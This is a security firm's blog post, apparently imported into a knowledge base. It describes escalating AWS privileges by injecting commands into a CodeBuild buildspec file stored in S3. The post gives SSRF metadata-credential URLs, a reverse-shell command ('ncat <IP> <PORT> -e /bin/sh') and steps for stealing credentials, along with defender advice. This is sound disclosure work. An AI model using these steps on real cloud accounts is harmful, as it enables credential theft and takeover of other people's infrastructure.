---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-10_aws-codebuild-s3-privilege-escalation.md
original_filename: 2023-07-10_aws-codebuild-s3-privilege-escalation.md
title: AWS CodeBuild + S3 == Privilege Escalation
category: documents
detected_topics:
- ssrf
- cloud-security
- command-injection
- access-control
- otp
- rate-limit
tags:
- imported
- documents
- ssrf
- cloud-security
- command-injection
- access-control
- otp
- rate-limit
language: en
raw_sha256: dabc918556989f51860d7f3df19b874524758233f093fc80e7b9a4c80fbe53e0
text_sha256: 7a493acee98e176001a554adfce26da09bce4e703712b0b3e627039cdb525e07
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# AWS CodeBuild + S3 == Privilege Escalation

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-10_aws-codebuild-s3-privilege-escalation.md
- Source Type: markdown
- Detected Topics: ssrf, cloud-security, command-injection, access-control, otp, rate-limit
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `dabc918556989f51860d7f3df19b874524758233f093fc80e7b9a4c80fbe53e0`
- Text SHA256: `7a493acee98e176001a554adfce26da09bce4e703712b0b3e627039cdb525e07`


## Content

---
title: "AWS CodeBuild + S3 == Privilege Escalation"
page_title: "Shielder - AWS CodeBuild + S3 == Privilege Escalation"
url: "https://www.shielder.com/blog/2023/07/aws-codebuild--s3-privilege-escalation/"
final_url: "https://www.shielder.com/blog/2023/07/aws-codebuild--s3-privilege-escalation/"
authors: ["Paolo Cavaglià (@Paupu_95)"]
bugs: ["Cloud", "Privilege escalation"]
publication_date: "2023-07-10"
added_date: "2023-07-11"
source: "pentester.land/writeups.json"
original_index: 951
---

[![shielder logo homepage](https://www.shielder.com/img/logoshielder.svg)](https://www.shielder.com/ "homepage") __

  * [Home](https://www.shielder.com/ "Home")
  * [Company](https://www.shielder.com/company "Company")
  * [Services](https://www.shielder.com/services "Services")
  * [Advisories](https://www.shielder.com/advisories "Advisories")
  * [Blog](https://www.shielder.com/blog "Blog")
  * [Careers](https://www.shielder.com/careers "Careers")
  * [Contacts](https://www.shielder.com/contacts "Contacts")
  * ENG

[ENG](https://www.shielder.com/blog/2023/07/aws-codebuild--s3-privilege-escalation/ "ENG") [ITA](https://www.shielder.com/it/blog/2023/07/aws-codebuild--s3-privilege-escalation/ "ITA")

# AWS CodeBuild + S3 == Privilege Escalation

## Introduction

In the last decade one of the most common patterns observed in web applications is their shift to cloud environments. This means that in 2023 you can’t evaluate the security of a web application without going through a review of its cloud infrastructure as you might miss the elephant in the room. That’s why we - as in Shielder - always try to learn new techniques to assess the security of cloud environments. This post is about a privilege escalation vector which we have discovered during a recent assessment and which was not documented.

## TL;DR

If you have the `codebuild:StartBuild` and the `s3:PutObject` privileges along with a CodeBuild project which reads its configuration from an S3 bucket you have access to, then you can run arbitrary code in the context of the CodeBuild worker. Just want to know how to escalate your privileges? Jump to the exploit!

## Getting the AWS Keys

As ~~every~~ most of the cloud-related attacks, everything starts with a [Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery). This happens because most of cloud providers implement a metadata endpoint which could be reached by all the cloud-based resources to query some information about themself, the project they are part of, and sometimes about their authentication keys. A curated list of cloud metadata endpoints for various providers could be found here: <https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b>.

Our specific scenario was a web application running on an [AWS EC2](https://aws.amazon.com/ec2/) instance where we did find a full-read SSRF. The first thing you want to understand when it comes to AWS and SSRF is the version of the [Instance Metadata Service (IMDS)](https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/environments-cfg-ec2-imds.html) in use. This is a very important step because based on its version you would need different requirements to interact with it:

  * IMDSv1: no specific requirements are in place, by sending GET requests to the endpoints you can retrieve all the available information.
  * [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html): you should be able to send PUT requests with arbitrary headers to negotiate a token, then attach that token to all the GET requests to the various endpoints to retrieve all the available information.

The difference is quite significant as for IMDSv1 a regular SSRF is enough, while for IMDSv2 you usually need a very powerful SSRF or you must find a Remote Code Execution (RCE). Hopefully for us our target was using the version 1, therefore the following requests were enough to get the AWS keys for the role assigned to the EC2 instance:

  1. List the security credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  2. Obtain the Key ID, Key Secret, and Session Token for the listed security credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/{name_of_the_role}`

## Listing the Privileges

Once the AWS Keys have been obtained the first thing you want to do is to understand which privileges are bound to them. To do that you usually have two ways based on the privileges:

  1. If you have access to [IAM](https://aws.amazon.com/iam/), then you can simply list the privileges for the various roles.
  2. If you don’t have access to IAM, then you can brute force the privileges by simply trying all the AWS commands and check which are allowed and which are not. This can be done by using some off-the-shelf tools like [enumerate-iam](https://github.com/andresriancho/enumerate-iam) and [cloud-service-enum](https://github.com/NotSoSecure/cloud-service-enum).

Our role had some very interesting privileges, among the others:

  * `s3:*` \- which granted us the ability to list the buckets and edit their files.
  * `codebuild:ListProjects` \- which granted us the ability to list the CodeBuild projects.
  * `codebuild:StartBuild` \- which granted us the ability to start the build of a CodeBuild project.

## Common CodeBuild Privilege Escalations

[AWS CodeBuild](https://aws.amazon.com/codebuild/) is a fully managed continuous integration service that compiles source code, runs tests, and produces ready-to-deploy software packages.

Our EC2 instance had access to it as the web application running on it was part of a big infrastructure where:

  * Various websites were built using Drupal.
  * Each website was developed by a different agency.
  * All the websites were sharing the same Drupal multi-site installation.
  * The EC2 instance was able to trigger a build of the project when a new website was deployed and/or updated.

Having access to CodeBuild is a common vector for privilege escalations as usually in CodeBuild you assign a role to the worker and then you run arbitary code in the worker. The combination of these two elements grants you the ability to assign a role with a higher level of privileges to the worker and then get its AWS keys when the worker runs your code. Unfortunately, for this to work you need the following privileges:

  * `iam:PassRole` \- which allows you to assign the role to the worker.
  * `codebuild:CreateProject` or `codebuild:UpdateProject` \- which allows you to create or update a new CodeBuild project.
  * `codebuild:StartBuild` or `codebuild:StartBuildBatch` \- which allows you to start the CodeBuild build process.

This technique is very well documented on [HackTricks](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc), an awesome list of hacking techniques divided by topic with clear reproduction steps.

Murphy’s law strikes again, our scenario was a little bit different as we did not have the `iam:PassRole` privilege and we could not update CodeBuild projects.

## Time for a New Technique 🧑‍🍳

First of all we analyzed the available CodeBuild projects and we discovered that most of them had an assigned role which was likely to be more privileged than ours. Moreover, we discovered that CodeBuild grants the ability to store the [buildspec configuration file](https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html) on an S3 bucket. This file is used to rule the build workflow and contains, among the others, the commands to run.

As you might remember we had read/write access to the S3 buckets and we were able to start the build of CodeBuild projects. Does this sound as a privilege escalation vector? Yes - it does!

The plan was to:

  1. Select a CodeBuild project which was reading its buildspec file from an S3 bucket we had write access to.
  2. Edit the buildspec file by injecting the commands to start a reverse shell.
  3. Start the build of the selected CodeBuild project.

## Exploit

  1. List all the builds from CodeBuild.
  2. Find a CodeBuild project which stores the `buildspec` configuration file on an S3 bucket you have access to.
  3. Edit the “phases > pre_builds > commands” section and add the following commands:
  * `apt-get install nmap -y`
  * `ncat <IP> <PORT> -e /bin/sh`
  4. Start a new build process for the CodeBuild project.
  5. Notice that a reverse shell is invoked.
  6. Obtain the AWS Keys from the reverse shell:
  * Option A: Query the AWS metadata endpoint (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`)
  * Option B: Run the `env` command to obtain the credentials endpoint (`http://169.254.170.2/v2/credentials/<UUID>`)
  7. Abuse the new AWS Keypair which might have a higher level of privileges.

## Conclusion & Pitch 🗣

Thanks to this exploit we have been able to escalate our privileges to the ones of the CodeBuild project which turned out to be misconfigured and had the `iam:*` permission, which basically means it was just a matter of some very basic commands to take over the whole AWS infrastructure.

Hopefully, they chose to act preventively and hired us to unveil their misconfiguration and vulnerabilities before publicly deploying their infrastructure. What about you? Are you using a complex cloud architecture, do you want to learn which are the impacts of the potential vulnerabilities in your cloud hosted web app? [Get in touch with us](https://www.shielder.com/contacts/) and give a try to our team, they’re ready to unravel the ☁️☁️!

## Take Aways 🥡

Defenders 🛡️:

  * Make sure to follow the [Least Privilege principle](https://cheatsheetseries.owasp.org/cheatsheets/Secure_Product_Design_Cheat_Sheet.html#security-principles) in could environments too.
  * Review your cloud configurations, roles, profile, and privileges assigned to the various resources.
  * Enable IMDSv2 to raise your security posture and limit the impact of Server-Side Request Forgery vulnerabilities.
  * Don’t limit your Penetration Test to the web applications but focus also on the underlying infrastructure.

Attackers ⚔️: never surrender if the common cheatsheets are not covering your specific scenario - get creative 😉

P.S.: We have done a [pull request to HackTricks](https://github.com/carlospolop/hacktricks-cloud/pull/18) to implement this technique in their cheatsheet 📄

 __ 5 min

Date

10 July 2023

 __[cloud](/tags/cloud "cloud") [aws](/tags/aws "aws") [privilege escalation](/tags/privilege-escalation "privilege escalation")

Author

[paupu](/authors/paupu "paupu")

[ __](https://twitter.com/Paupu_95 "paupu Twitter profile")[__](https://github.com/Paupu "paupu GitHub profile")

I’m paupu, Security Researcher and Penetration Tester at Shielder. Once I told a bad joke to a server, it crashed - that’s how I find vulnerabilities now.

Previous post

[How to Decrypt Manage Engine PMP Passwords for Fun and Domain Admin - a Red Teaming Tale](https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/ "How to Decrypt Manage Engine PMP Passwords for Fun and Domain Admin - a Red Teaming Tale")

Next post

[CVE-2023-33466 - Exploiting Healthcare Servers with Polyglot Files](https://www.shielder.com/blog/2023/10/cve-2023-33466-exploiting-healthcare-servers-with-polyglot-files/ "CVE-2023-33466 - Exploiting Healthcare Servers with Polyglot Files")

Info

Shielder S.p.A.

P.I. 11435310013

REA TO - 1213132

Registered Capital: 81.000,00 €

[Via Palestro, 1/C  
10064 Pinerolo (TO) Italy](https://www.google.it/maps/place/Shielder/@44.8833849,7.3303863,17z/data=!3m1!4b1!4m5!3m4!1s0x4788250440849fa5:0x74cf10f2092abc85!8m2!3d44.8833849!4d7.332575 "corporate headquarters")

![ISO27001](/img/iso27001.png)

![ISO9001](/img/iso9001.png)

Contacts

[info@shielder.com](mailto:info@shielder.com "email Shielder")

Landline: [(+39) 0121 - 39 36 42](tel:+390121393642 "Landline")

Commercial: [(+39) 345 - 57 18 634](tel:+393455718634 "Commercial")

Technical: [(+39) 393 - 16 66 814](tel:+393931666814 "Technical")

[ __](https://twitter.com/ShielderSec "Shielder Twitter profile")[__](https://bsky.app/profile/shielder.com "Shielder Bluesky profile")[__](https://infosec.exchange/@Shielder "Shielder Mastodon profile")[__](https://www.linkedin.com/company/shielder "Shielder LinkedIn profile")[__](https://github.com/shieldersec "Shielder Github profile")

Sitemap

[Home](https://www.shielder.com/ "Home")

[Company](https://www.shielder.com/company "Company")

[Services](https://www.shielder.com/services "Services")

[Advisories](https://www.shielder.com/advisories "Advisories")

[Blog](https://www.shielder.com/blog "Blog")

[Careers](https://www.shielder.com/careers "Careers")

[Contacts](https://www.shielder.com/contacts "Contacts")

Copyright © Shielder 2014 - 2026 [Disclosure policy](/disclosure-policy "Disclosure Policy") [Privacy policy](/privacy-policy "Privacy Policy")
